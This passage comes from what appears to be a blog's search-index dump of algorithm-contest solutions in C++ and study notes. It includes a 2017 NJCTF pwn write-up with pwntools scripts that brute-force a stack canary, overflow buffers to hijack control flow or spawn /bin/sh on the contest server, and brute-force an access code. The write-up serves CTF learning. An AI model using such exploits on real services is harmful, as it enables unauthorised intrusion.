Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;string&gt;#include&lt;algorithm&gt;using namespace std;typedef long long LL;int p[101];int a[101];char x;int y;int pos;int cur = 1;int getpos(int n)&#123; for (int i = 1; i &lt; cur; i++) &#123; if (p[i] == n) return i; &#125;&#125;void _swap(int begin, int end)&#123; for (; end &gt; begin; end--, begin++) &#123; swap(p[begin], p[end]); &#125;&#125;bool check(int n)&#123; for (int i = n; i &gt; 1; i--) if (a[i] != p[i]) return false; return true;&#125;int main()&#123; while (true) &#123; cur = 1; while (scanf(\"%d\", &amp;y)) &#123; x = getchar(); if (x == EOF) return 0; a[cur] = y; p[cur++] = y; if (x == '\\n') break; &#125; for (int i = 1; i &lt; cur; i++) i != cur - 1 ? printf(\"%d \", p[i]) : printf(\"%d\\n\", p[i]); sort(a + 1, a + cur); for (int i = cur - 1; i &gt; 1; i--) &#123; if (!check(i)) &#123; pos = getpos(a[i]); _swap(1, pos); printf(\"%d \", cur - pos); _swap(1, i); printf(\"%d \", cur - i); &#125; &#125; printf(\"0\\n\"); &#125; return 0;&#125;","tags":[{"name":"UVa","slug":"UVa","permalink":"http://reehy.top/tags/UVa/"},{"name":"构造法","slug":"构造法","permalink":"http://reehy.top/tags/构造法/"}]},{"title":"C++ STL poriority_queue","date":"2017-03-17T04:36:37.000Z","path":"2017/03/17/C-STL-poriority-queue/","text":"poriority_queue排在队首的是优先级最高的节点，越大的int优先级越高。对于自定义的数据类型，不需要准确的定义优先级的大小，只要能相互比较大小即可。 模板定义如下： 1template &lt;class T, class Container = vector&lt;T&gt;, class Compare = less&lt;typename Container::value_type&gt; &gt; class priority_queue; 成员函数 函数 用法 empty() 判断是否非空 size() 返回有限队列大小 top() 返回优先级最大的node的值 push() 插入一个元素 emplace() 建立并插入一个元素 pop() 弹出优先队列的优先级最大的node swap() 交换两个优先队列","tags":[{"name":"STL","slug":"STL","permalink":"http://reehy.top/tags/STL/"}]},{"title":"2017NJCTF PWN","date":"2017-03-14T14:04:51.000Z","path":"2017/03/14/2017NJCTF-PWN/","text":"messagerfork，出来的进程基本上和原进程完全一样，包括canary和ebp。爆破canary，得到值后跳转到0x400BC6。因为程序已经将flag加载到内存中了，这里的代码将内存中的flag发过来。 说几个因为太菜的坑吧。。 pwntools的sendline会在最后添加上\\x0a，而send会直接把数据发过去，我一度以为\\x0a是发送结尾的标配以至于不能爆破。。 关于linux的僵尸进程，kill是杀不掉的。。kill -9 PID可以杀掉，killall name可以杀掉包括进程簇，pstree或者ps auxt可以查看进程树。defeunc进程如果没有父进程的话。。重启吧Orz exp1234567891011121314151617181920212223242526272829303132333435363738394041from pwn import *import os, sysDEBUG = 0elf = ELF('./messager')if DEBUG: context(log_level='debug') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')def do_canary(): canary = '\\x00' off = 'a' * 104 while (len(canary)) != 8: for i in range(256): p = remote('127.0.0.1', 5555) p.recvuntil('Welcome!\\n') t = chr(i) try: print 'sending....', i p.send(off + canary + t) line = p.recvline() if 'Message' in line: p.close() canary += t break except Exception, e: print e p.close() continue return canaryif __name__ == '__main__': canary = do_canary() p = remote('127.0.0.1', 5555) p.recvuntil('Welcome!') payload = 'a' * 104 + canary + p64(0) + p64(0x400BC6) p.send(payload) print p.recvall() p.close() vsvs程序应该是调用的system(&quot;echo input&quot;)，这样的函数，也就是说如果想办法让程序执行system(&quot;/bin/sh)那么就可以得到shell了。然而到现在我都还没搞懂这个程序的运行原理，存在read的栈溢出为什么就可以绕过过滤执行命令了呢。是覆盖了之前写的input里的值了么 流程123456789ubuntu@VM-250-199-ubuntu:~/ctf-problem/2017njctf/pwn/vsvs$ nc 218.2.197.235 23749 VSVS: Very Secure VPN ServerPlease input access code:22Command: echo &lt;input&gt;input:aaaWhat's your name?bbbaaa 在What&#39;s your name?后存在栈溢出，猜测是超出缓冲区长度，覆盖了input中存在检查的值了 exp:1234567891011121314151617181920212223242526from pwn import *'''for i in range(10000000): try: p = remote('218.2.197.235', 23749) p.recvuntil('code:\\n') print 'sendling.... ', i p.sendline(str(i)) a = p.recvline() if 'Wrong' in a: p.close() continue else: print 'code is =&gt; ', i break except Exception, e: continue'''p = remote('218.2.197.235', 23749)exp = 'a' * 1024 + '/bin/sh'p.sendlineafter('code:\\n', '22')p.sendlineafter('input:\\n', '1')p.sendlineafter('?', exp)p.interactive()","tags":[{"name":"PWN","slug":"PWN","permalink":"http://reehy.top/tags/PWN/"}]},{"title":"POJ 1003","date":"2017-03-13T08:57:52.000Z","path":"2017/03/13/POJ-1003/","text":"Description How far can you make a stack of cards overhang a table? If you have one card, you can create a maximum overhang of half a card length. (We’re assuming that the cards must be perpendicular to the table.) With two cards you can make the top card overhang the bottom one by half a card length, and the bottom one overhang the table by a third of a card length, for a total maximum overhang of 1/2 + 1/3 = 5/6 card lengths. In general you can make n cards overhang by 1/2 + 1/3 + 1/4 + … + 1/(n + 1) card lengths, where the top card overhangs the second by 1/2, the second overhangs tha third by 1/3, the third overhangs the fourth by 1/4, etc., and the bottom card overhangs the table by 1/(n + 1). This is illustrated in the figure below. InputThe input consists of one or more test cases, followed by a line containing the number 0.00 that signals the end of the input. Each test case is a single line containing a positive floating-point number c whose value is at least 0.01 and at most 5.20; c will contain exactly three digits. OutputFor each test case, output the minimum number of cards necessary to achieve an overhang of at least c card lengths. Use the exact output format shown in the examples. Sample Input1.003.710.045.190.00 Sample Output3 card(s)61 card(s)1 card(s)273 card(s) 简单题 Code1234567891011121314151617181920212223242526#include&lt;cstdio&gt;using namespace std;typedef long long LL;float n;int i = 2;float sum = 0;int main()&#123; scanf(\"%f\", &amp;n); while (n != 0) &#123; sum = 0; i = 2; while (sum &lt; n) &#123; sum += 1.0 / (float)i; i++; &#125; printf(\"%d card(s)\\n\", i - 2); scanf(\"%f\", &amp;n); &#125; return 0;&#125;","tags":[{"name":"POJ","slug":"POJ","permalink":"http://reehy.top/tags/POJ/"}]},{"title":"POJ 1002","date":"2017-03-12T14:34:54.000Z","path":"2017/03/12/POJ-1002/","text":"Description Businesses like to have memorable telephone numbers. One way to make a telephone number memorable is to have it spell a memorable word or phrase. For example, you can call the University of Waterloo by dialing the memorable TUT-GLOP. Sometimes only part of the number is used to spell a word. When you get back to your hotel tonight you can order a pizza from Gino’s by dialing 310-GINO. Another way to make a telephone number memorable is to group the digits in a memorable way. You could order your pizza from Pizza Hut by calling their “three tens’’ number 3-10-10-10. The standard form of a telephone number is seven decimal digits with a hyphen between the third and fourth digits (e.g. 888-1200). The keypad of a phone supplies the mapping of letters to numbers, as follows: A, B, and C map to 2D, E, and F map to 3G, H, and I map to 4J, K, and L map to 5M, N, and O map to 6P, R, and S map to 7T, U, and V map to 8W, X, and Y map to 9 There is no mapping for Q or Z. Hyphens are not dialed, and can be added and removed as necessary. The standard form of TUT-GLOP is 888-4567, the standard form of 310-GINO is 310-4466, and the standard form of 3-10-10-10 is 310-1010. Two telephone numbers are equivalent if they have the same standard form. (They dial the same number.) Your company is compiling a directory of telephone numbers from local businesses. As part of the quality control process you want to check that no two (or more) businesses in the directory have the same telephone number. Input The input will consist of one case. The first line of the input specifies the number of telephone numbers in the directory (up to 100,000) as a positive integer alone on the line. The remaining lines list the telephone numbers in the directory, with each number alone on a line. Each telephone number consists of a string composed of decimal digits, uppercase letters (excluding Q and Z) and hyphens. Exactly seven of the characters in the string will be digits or letters.Output Generate a line of output for each telephone number that appears more than once in any form. The line should give the telephone number in standard form, followed by a space, followed by the number of times the telephone number appears in the directory. Arrange the output lines by telephone number in ascending lexicographical order. If there are no duplicates in the input print the line: No duplicates. Sample Input124873279ITS-EASY888-45673-10-10-10888-GLOPTUT-GLOP967-11-11310-GINOF101010888-1200-4-8-7-3-2-7-9-487-3279 Sample Output 310-1010 2487-3279 4888-4567 3 我用了map，纯偷懒的方法。因为map的内部是红黑树的实现，所以速度还是比较快的。看了别人的方法，还有其他的实现： 快排 哈希表 Trie树（前缀树/字典树），这个应该是最快的方法 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;cstdio&gt;#include&lt;string&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;vector&gt;#include&lt;stack&gt;#include&lt;queue&gt;#include&lt;map&gt;using namespace std;typedef long long LL;const int maxN = 1e5 + 10;map&lt;string , int&gt;tel;int n;int flag = 0;string a;char get(char c)&#123; if (c &gt;= 'A' &amp;&amp; c &lt;= 'P') return (c - 'A') / 3 + 2 + '0'; if (c &gt;= 'R' &amp;&amp; c &lt;= 'Y') return (c - 'A' - 1) / 3 + 2 + '0'; if (c &gt;= '0' &amp;&amp; c &lt;= '9') return c ; return c;&#125;int main()&#123; scanf(\"%d\", &amp;n); getchar(); for (int i = 0; i &lt; n;) &#123; a = \"\"; for (int j = 0;;) &#123; char x = getchar(); char y = get(x); if (j == 3) &#123; a += '-'; j++; &#125; if (y == '-') continue; if (y == '\\n') &#123; i++; tel[a]++; break; &#125; a += y; j++; &#125; &#125; map&lt;string, int&gt;::iterator it; for (it = tel.begin(); it != tel.end(); it++) &#123; if (it-&gt;second &gt; 1) &#123; flag = 1; cout &lt;&lt; it-&gt;first &lt;&lt; ' ' &lt;&lt; it-&gt;second &lt;&lt; endl; &#125; else continue; &#125; if (!flag) cout &lt;&lt; \"No duplicates.\\n\"; return 0;&#125;","tags":[{"name":"POJ","slug":"POJ","permalink":"http://reehy.top/tags/POJ/"}]},{"title":"告一段落的","date":"2017-03-05T00:18:57.000Z","path":"2017/03/05/告一段落的/","text":"昨天考完了PAT，能力不济是其一，没有拿到满分；另外CS的竞争是激烈的，我等非科班出身的应真切的看到自身的处境。不过也正是这样才有趣的吧。 总结下这次PAT的收获吧： 春季考试很可能放水 永远不要有侥幸心理，因为复习的不考，考的不复习，所以好好准备 人外有人，天外有天 人若无名，便可专心练剑。物若无名，便可随意取舍。 下面的任务吧： Machine Learning网课 线代 XCTF PAT每日一练 ACM TOFEL 每日计划完成，感觉自己离梦想又近了一步，反则更远了一步。","tags":[{"name":"life","slug":"life","permalink":"http://reehy.top/tags/life/"}]},{"title":"PAT advanced 1102","date":"2017-03-03T12:11:10.000Z","path":"2017/03/03/PAT-advanced-1102/","text":"Description 1102.Invert a Binary Tree Google: 90% of our engineers use the software you wrote (Homebrew), but you can’t invert a binary tree on a whiteboard so fuck off. Now it’s your turn to prove that YOU CAN invert a binary tree! Input Specification: Each input file contains one test case. For each case, the first line gives a positive integer N (&lt;=10) which is the total number of nodes in the tree – and hence the nodes are numbered from 0 to N-1. Then N lines follow, each corresponds to a node from 0 to N-1, and gives the indices of the left and right children of the node. If the child does not exist, a “-“ will be put at the position. Any pair of children are separated by a space. Output Specification: For each test case, print in the first line the level-order, and then in the second line the in-order traversal sequences of the inverted tree. There must be exactly one space between any adjacent numbers, and no extra space at the end of the line. Sample Input:81 -- -0 -2 7- -- -5 -4 6 Sample Output:3 7 2 6 4 0 5 16 5 7 4 3 2 0 1 dfs+inorder，考前练手。。 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;vector&gt;#include&lt;queue&gt;using namespace std;typedef long long LL;const int maxN = 10;int n;int node[maxN][2];char x;int y;int z;int root[maxN];int flag;void dfs(int root)&#123; queue&lt;int&gt; q; q.push(root); while (!q.empty()) &#123; int tmp; tmp = q.front(); q.pop(); tmp == root ? printf(\"%d\", tmp) : printf(\" %d\", tmp); if (node[tmp][1] != -1) q.push(node[tmp][1]); if (node[tmp][0] != -1) q.push(node[tmp][0]); &#125; printf(\"\\n\");&#125;void inorder(int root)&#123; if (node[root][1] != -1) inorder(node[root][1]); ++z != n ? printf(\"%d \", root): printf(\"%d\\n\", root); if (node[root][0] != -1) inorder(node[root][0]);&#125;int main()&#123; scanf(\"%d\", &amp;n); getchar(); for (int i = 0; i &lt; n; i++) &#123; ((x = getchar()) != 45) ? (node[i][0] = x - '0') : (node[i][0] = -1); getchar(); ((x = getchar()) != 45 )? (node[i][1] = x - '0') : (node[i][1] = -1); getchar(); &#125; for (int i = 0; i &lt; n; i++) &#123; y = node[i][0]; if (y != -1) root[y] = 1; y = node[i][1]; if (y != -1) root[y] = 1; &#125; for (int i = 0; i &lt; n; i++) if (root[i] != 1) &#123; flag = i; break; &#125; dfs(flag); inorder(flag); return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1122","date":"2017-02-27T15:25:13.000Z","path":"2017/02/27/PAT-advanced-1122/","text":"Description 1122.Hamiltonian Cycle The “Hamilton cycle problem” is to find a simple cycle that contains every vertex in a graph. Such a cycle is called a “Hamiltonian cycle”. In this problem, you are supposed to tell if a given cycle is a Hamiltonian cycle. Input Specification: Each input file contains one test case. For each case, the first line contains 2 positive integers N (2&lt; N &lt;= 200), the number of vertices, and M, the number of edges in an undirected graph. Then M lines follow, each describes an edge in the format “Vertex1 Vertex2”, where the vertices are numbered from 1 to N. The next line gives a positive integer K which is the number of queries, followed by K lines of queries, each in the format: n V1 V2 … Vn where n is the number of vertices in the list, and Vi’s are the vertices on a path. Output Specification: For each query, print in a line “YES” if the path does form a Hamiltonian cycle, or “NO” if not. Sample Input:6 106 23 41 52 53 14 11 66 31 24 567 5 1 4 3 6 2 56 5 1 4 3 6 29 6 2 1 6 3 4 5 2 64 1 2 5 17 6 1 3 4 5 2 67 6 1 2 5 4 3 1Sample Output:YESNONONOYESNO 伪哈密顿图。 Code1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;vector&gt;using namespace std;typedef long long LL;const int maxN = 2e2 + 10;const int maxM = 2e4 + 10;int n, m, k;int e[maxN][maxN];int ans[maxN];int s[maxN];int x, y;int main()&#123; scanf(\"%d%d\", &amp;n, &amp;m); for (int i = 0; i &lt; m; i++) &#123; scanf(\"%d%d\", &amp;x, &amp;y); e[x][y] = e[y][x] = 1; &#125; scanf(\"%d\", &amp;k); while (k--) &#123; int p; scanf(\"%d\", &amp;p); int flag = p &gt;= n + 1; for (int i = 1; i &lt;= p; i++) scanf(\"%d\", &amp;ans[i]); flag &amp;= ans[1] == ans[p]; for (int i = 1; i &lt;= maxN; i++)s[i] = 0; for (int i = 1; i &lt; p; i++) &#123; if (s[ans[i]]++) flag = 0; flag &amp;= e[ans[i]][ans[i + 1]]; &#125; printf(\"%s\\n\", flag ? \"YES\" : \"NO\"); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1080","date":"2017-02-23T04:42:47.000Z","path":"2017/02/23/PAT-advanced-1080/","text":"Description 1080.Graduate Admission It is said that in 2013, there were about 100 graduate schools ready to proceed over 40,000 applications in Zhejiang Province. It would help a lot if you could write a program to automate the admission procedure. Each applicant will have to provide two grades: the national entrance exam grade GE, and the interview grade GI. The final grade of an applicant is (GE + GI) / 2. The admission rules are: The applicants are ranked according to their final grades, and will be admitted one by one from the top of the rank list.If there is a tied final grade, the applicants will be ranked according to their national entrance exam grade GE. If still tied, their ranks must be the same.Each applicant may have K choices and the admission will be done according to his/her choices: if according to the rank list, it is one’s turn to be admitted; and if the quota of one’s most preferred shcool is not exceeded, then one will be admitted to this school, or one’s other choices will be considered one by one in order. If one gets rejected by all of preferred schools, then this unfortunate applicant will be rejected.If there is a tied rank, and if the corresponding applicants are applying to the same school, then that school must admit all the applicants with the same rank, even if its quota will be exceeded.Input Specification: Each input file contains one test case. Each case starts with a line containing three positive integers: N (&lt;=40,000), the total number of applicants; M (&lt;=100), the total number of graduate schools; and K (&lt;=5), the number of choices an applicant may have. In the next line, separated by a space, there are M positive integers. The i-th integer is the quota of the i-th graduate school respectively. Then N lines follow, each contains 2+K integers separated by a space. The first 2 integers are the applicant’s GE and GI, respectively. The next K integers represent the preferred schools. For the sake of simplicity, we assume that the schools are numbered from 0 to M-1, and the applicants are numbered from 0 to N-1. Output Specification: For each test case you should output the admission results for all the graduate schools. The results of each school must occupy a line, which contains the applicants’ numbers that school admits. The numbers must be in increasing order and be separated by a space. There must be no extra space at the end of each line. If no applicant is admitted by a school, you must output an empty line correspondingly. Sample Input:11 6 32 1 2 2 2 3100 100 0 1 260 60 2 3 5100 90 0 3 490 100 1 2 090 90 5 1 380 90 1 0 280 80 0 1 280 80 0 1 280 70 1 3 270 80 1 2 3100 100 0 2 4 Sample Output:0 1035 6 72 8 1 4 一个点超时了没过，以后再改 Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;vector&gt;using namespace std;typedef long long LL;const int maxN = 4e4 + 10;const int maxM = 1e2 + 10;const int maxK = 5;int n, m, k;struct stu&#123; int id; int e, i; int a[maxK]; int g; int s;&#125;stu[maxN];vector&lt;int&gt; ans[maxM];bool cmp(int a, int b)&#123; return stu[a].id &lt; stu[b].id;&#125;int main()&#123; scanf(\"%d%d%d\", &amp;n, &amp;m, &amp;k); for (int i = 0; i &lt; m; i++) &#123; int x; scanf(\"%d\", &amp;x); ans[i].push_back(x); &#125; for (int i = 0; i &lt; n; i++) &#123; stu[i].id = i; scanf(\"%d%d\", &amp;stu[i].e, &amp;stu[i].i); stu[i].s = stu[i].e + stu[i].i; for (int j = 0; j &lt; k; j++) scanf(\"%d\", &amp;stu[i].a[j]); &#125; //sort for (int i = 0; i &lt; n; i++) for (int j = i; j &lt; n; j++) if (stu[i].s &lt; stu[j].s) swap(stu[i], stu[j]); else if (stu[i].s == stu[j].s &amp;&amp; stu[i].e &lt; stu[j].e) swap(stu[i], stu[j]); stu[0].g = 0; for (int i = 1; i &lt; n; i++) stu[i].g = (stu[i].s == stu[i - 1].s &amp;&amp; stu[i].e == stu[i - 1].e) ? stu[i - 1].g : i; /***********************************************************/ for (int i = 0; i &lt; n; i++) &#123; for (int j = 0; j &lt; k; j++) &#123; if (ans[stu[i].a[j]][0] &gt; 0) &#123; ans[stu[i].a[j]][0]--; ans[stu[i].a[j]].push_back(i); // 压入录取学生排名 break; &#125; else if (ans[stu[i].a[j]][0] &lt;= 0 &amp;&amp; stu[ans[stu[i].a[j]].back()].g == stu[i].g) &#123; ans[stu[i].a[j]][0]--; ans[stu[i].a[j]].push_back(i); break; &#125; &#125; &#125; /*********************************************************/ for (int i = 0; i &lt; m; i++) sort(ans[i].begin() + 1, ans[i].end(), cmp); for (int i = 0; i &lt; m; i++) &#123; for (int j = 1; j &lt; ans[i].size(); j++) (j == 1) ? printf(\"%d\", stu[ans[i][j]].id) : printf(\" %d\", stu[ans[i][j]].id); printf(\"\\n\"); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1022","date":"2017-02-22T09:31:15.000Z","path":"2017/02/22/PAT-advanced-1022/","text":"Description 1022.Digital Library A Digital Library contains millions of books, stored according to their titles, authors, key words of their abstracts, publishers, and published years. Each book is assigned an unique 7-digit number as its ID. Given any query from a reader, you are supposed to output the resulting books, sorted in increasing order of their ID’s. Input Specification: Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=10000) which is the total number of books. Then N blocks follow, each contains the information of a book in 6 lines: Line #1: the 7-digit ID number;Line #2: the book title – a string of no more than 80 characters;Line #3: the author – a string of no more than 80 characters;Line #4: the key words – each word is a string of no more than 10 characters without any white space, and the keywords are separated by exactly one space;Line #5: the publisher – a string of no more than 80 characters;Line #6: the published year – a 4-digit number which is in the range [1000, 3000].It is assumed that each book belongs to one author only, and contains no more than 5 key words; there are no more than 1000 distinct key words in total; and there are no more than 1000 distinct publishers. After the book information, there is a line containing a positive integer M (&lt;=1000) which is the number of user’s search queries. Then M lines follow, each in one of the formats shown below: 1: a book title2: name of an author3: a key word4: name of a publisher5: a 4-digit number representing the yearOutput Specification: For each query, first print the original query in a line, then output the resulting book ID’s in increasing order, each occupying a line. If no book is found, print “Not Found” instead. Sample Input:31111111The Testing BookYue Chentest code debug sort keywordsZUCS Print20113333333Another Testing BookYue Chentest code sort keywordsZUCS Print220122222222The Testing BookCYLLkeywords debug bookZUCS Print2201161: The Testing Book2: Yue Chen3: keywords4: ZUCS Print5: 20113: blablabla Sample Output:1: The Testing Book111111122222222: Yue Chen111111133333333: keywords1111111222222233333334: ZUCS Print11111115: 2011111111122222223: blablablaNot Found 哇题目都没看清的我居然过了，是写了个更鲁棒的代码？（笑）map+set的使用，第一遍超时，后来减少查找，增加映射过了- - Code123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960#include&lt;cstdio&gt;#include&lt;string&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;map&gt;#include&lt;set&gt;using namespace std;typedef long long LL;const int maxN = 1e4 + 10;set&lt;string&gt; s;int n, m;string x, y, z;map&lt;string, set&lt;string&gt;&gt; f;void fin(string x)&#123; if (f.find(x) != f.end()) for (set&lt;string&gt;::iterator it = f[x].begin(); it != f[x].end(); it++) cout &lt;&lt; *it &lt;&lt; endl; else cout &lt;&lt; \"Not Found\" &lt;&lt; endl;&#125;int main()&#123; scanf(\"%d\\n\", &amp;n); for (int i = 0; i &lt; n; i++) &#123; getline(cin, x); getline(cin, y); f[y].insert(x); getline(cin, y); f[y].insert(x); while (true) &#123; cin &gt;&gt; y; f[y].insert(x); if (getchar() == '\\n') break; &#125; getline(cin, y); f[y].insert(x); getline(cin, y); f[y].insert(x); &#125; scanf(\"%d\\n\", &amp;m); for (int i = 0; i &lt; m; i++) &#123; getline(cin, y); cout &lt;&lt; y &lt;&lt; endl; z = y.substr(3, y.size()); fin(z); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1064","date":"2017-02-21T14:53:48.000Z","path":"2017/02/21/PAT-advanced-1064/","text":"Descripton 1064.Complete Binary Search Tree A Binary Search Tree (BST) is recursively defined as a binary tree which has the following properties: The left subtree of a node contains only nodes with keys less than the node’s key.The right subtree of a node contains only nodes with keys greater than or equal to the node’s key.Both the left and right subtrees must also be binary search trees.A Complete Binary Tree (CBT) is a tree that is completely filled, with the possible exception of the bottom level, which is filled from left to right. Now given a sequence of distinct non-negative integer keys, a unique BST can be constructed if it is required that the tree must also be a CBT. You are supposed to output the level order traversal sequence of this BST. Input Specification: Each input file contains one test case. For each case, the first line contains a positive integer N (&lt;=1000). Then N distinct non-negative integer keys are given in the next line. All the numbers in a line are separated by a space and are no greater than 2000. Output Specification: For each test case, print in one line the level order traversal sequence of the corresponding complete binary search tree. All the numbers in a line must be separated by a space, and there must be no extra space at the end of the line. Sample Input:101 2 3 4 5 6 7 8 9 0 Sample Output:6 3 8 1 5 7 9 0 2 4 先建完全二叉树，然后中序遍历存放数值，最后bfs输出。开心，好像一次过的情况变得多起来了~可是为什么我的代码这么丑啊QAQ Code1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677#include&lt;cstdio&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;queue&gt;using namespace std;typedef long long LL;const int maxN = 1e3 + 10;struct t&#123; int d; int l; int r; int flag = 0;&#125;t[maxN];int n;int b[maxN];int k = 1;void inorder(int a)&#123; if (t[a].flag) &#123; inorder(t[a].l); t[a].d = b[k++]; inorder(t[a].r); &#125;&#125;void bfs(int root)&#123; queue&lt;int&gt; q; q.push(root); while (!q.empty()) &#123; if (t[t[q.front()].l].flag) q.push(t[q.front()].l); if (t[t[q.front()].r].flag) q.push(t[q.front()].r); (q.size() != 1) ? printf(\"%d \", t[q.front()].d) : printf(\"%d\\n\", t[q.front()].d); q.pop(); &#125;&#125;int main()&#123; scanf(\"%d\", &amp;n); for (int i = 1; i &lt;= n; i++) scanf(\"%d\", b+i); sort(b+1, b+n+1); for (int i = 1; i &lt;= n; i++) &#123; t[i].flag = 1; if (n % 2 == 0 &amp;&amp; i * 2 &lt;= n) &#123; if (i != n / 2) &#123; t[i].l = i * 2; t[i].r = i * 2 + 1; &#125; else &#123; t[i].l = i * 2; &#125; &#125; if (n % 2 == 1 &amp;&amp; i * 2 + 1 &lt;= n) &#123; t[i].l = i * 2; t[i].r = i * 2 + 1; &#125; &#125; inorder(1); bfs(1); return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1049","date":"2017-02-21T12:18:39.000Z","path":"2017/02/21/PAT-advanced-1049/","text":"Description 1049.Counting Ones The task is simple: given any positive integer N, you are supposed to count the total number of 1’s in the decimal form of the integers from 1 to N. For example, given N being 12, there are five 1’s in 1, 10, 11, and 12. Input Specification: Each input file contains one test case which gives the positive N (&lt;=230). Output Specification: For each test case, print the number of 1’s in one line. Sample Input:12 Sample Output:5 发现了别人的更好的解法(想法一样，实现比我好)，贴上来 如果这位大于1，那么1的总数等于（左边的值+1）*（右边的位数）如果这位等于1，那么1的总数等于（左边的值）*（右边的位数）+右边的值如果这位等于0，那么1的总数等于（左边的值）*（右边的位数） Code123456789101112131415161718192021222324252627282930313233#include&lt;cstdio&gt;#include&lt;string&gt;#include&lt;cmath&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;limits&gt;#include&lt;queue&gt;using namespace std;typedef long long LL;int n;int r, l, it;int ans = 0;int main()&#123; cin &gt;&gt; n; int rr = 0;; for (int i = 0, l = n / 10, r = 1; n; n /= 10, l /= 10, r *= 10) &#123; int x = n % 10; if (x &gt; 1) ans += (l + 1) * r; if (x == 1) ans += l * r + rr; if (x == 0) ans += l * r; rr += n % 10 * r; &#125; printf(\"%d\\n\", ans); return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1076","date":"2017-02-21T06:54:07.000Z","path":"2017/02/21/PAT-advanced-1076/","text":"Description 1076.Forwards on Weibo Weibo is known as the Chinese version of Twitter. One user on Weibo may have many followers, and may follow many other users as well. Hence a social network is formed with followers relations. When a user makes a post on Weibo, all his/her followers can view and forward his/her post, which can then be forwarded again by their followers. Now given a social network, you are supposed to calculate the maximum potential amount of forwards for any specific user, assuming that only L levels of indirect followers are counted. Input Specification: Each input file contains one test case. For each case, the first line contains 2 positive integers: N (&lt;=1000), the number of users; and L (&lt;=6), the number of levels of indirect followers that are counted. Hence it is assumed that all the users are numbered from 1 to N. Then N lines follow, each in the format: M[i] user_list[i] where M[i] (&lt;=100) is the total number of people that user[i] follows; and user_list[i] is a list of the M[i] users that are followed by user[i]. It is guaranteed that no one can follow oneself. All the numbers are separated by a space. Then finally a positive K is given, followed by K UserID’s for query. Output Specification: For each UserID, you are supposed to print in one line the maximum potential amount of forwards this user can triger, assuming that everyone who can view the initial post will forward it once, and that only L levels of indirect followers are counted. Sample Input:7 33 2 3 402 5 62 3 12 3 41 41 52 2 6 Sample Output:45 哇，难得的一次过233。。。BFS Code12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273#include&lt;cstdio&gt;#include&lt;cmath&gt;#include&lt;iostream&gt;#include&lt;algorithm&gt;#include&lt;limits&gt;#include&lt;queue&gt;using namespace std;typedef long long LL;const int maxN = (1e3 + 10) + 1;int n, l;int m[maxN][maxN];int lay[maxN];bool vis[maxN];int x, y;int p;int ans[maxN];queue&lt;int&gt; q;int bfs(int root, int l)&#123; int w; int flag = 1; int ans = 0; for (int i = 1; i &lt; maxN; i++) vis[i] = false; q.push(root); vis[root] = true; lay[root] = 0; while (!q.empty()) &#123; flag = 1; root = q.front(); q.pop(); w = m[root][flag]; while (w) &#123; if (!vis[w]) &#123; vis[w] = true; lay[w] = lay[root] + 1; q.push(w); if (lay[w] &lt;= l ) ans++; &#125; flag++; w = m[root][flag]; &#125; &#125; return ans;&#125;int main()&#123; scanf(\"%d%d\", &amp;n, &amp;l); for (int i = 1; i &lt;= n; i++) &#123; scanf(\"%d\", &amp;x); for (int j = 1; j &lt;= x; j++) &#123; scanf(\"%d\", &amp;y); m[y][++m[y][0]] = i; //m[i][j] = y; &#125; &#125; scanf(\"%d\", &amp;p); for (int i = 1; i &lt;= p; i++) scanf(\"%d\", &amp;ans[i]); for (int i = 1; i &lt;= p; i++) &#123; printf(\"%d\\n\", bfs(ans[i], l)); &#125; return 0;&#125;","tags":[{"name":"PAT","slug":"PAT","permalink":"http://reehy.top/tags/PAT/"}]},{"title":"PAT advanced 1101","date":"2017-02-20T12:24:51.000Z","path":"2017/02/20/PAT-advanced-1101/","text":"Description 1101.Quick Sort There is a classical process named partition in the famous quick sort algorithm. In this process we typically choose one element as the pivot. Then the elements less than the pivot are moved to its left and those larger than the pivot to its right. Given N distinct positive integers after a run of partition, could you tell how many elements could be the selected pivot for this partition? For example, given N = 5 and the numbers 1, 3, 2, 4, and 5. We have: 1 could be the pivot since there is no element to its left and all the elements to its right are larger than it;3 must not be the pivot since although all the elements to its left are smaller, the number 2 to its right is less than it as well;2 must not be the pivot since although all the elements to its right are larger, the number 3 to its left is larger than it as well;and for the similar reason, 4 and 5 could also be the pivot.Hence in total there are 3 pivot candidates. Input Specification: Each input file contains one test case. For each case, the first line gives a positive integer N (&lt;= 105). Then the next line contains N distinct positive integers no larger than 109. The numbers in a line are separated by spaces. Output Specification: For each test case, output in the first line the number of pivot candidates. Then in the next line print these candidates in increasing order. There must be exactly 1 space between two 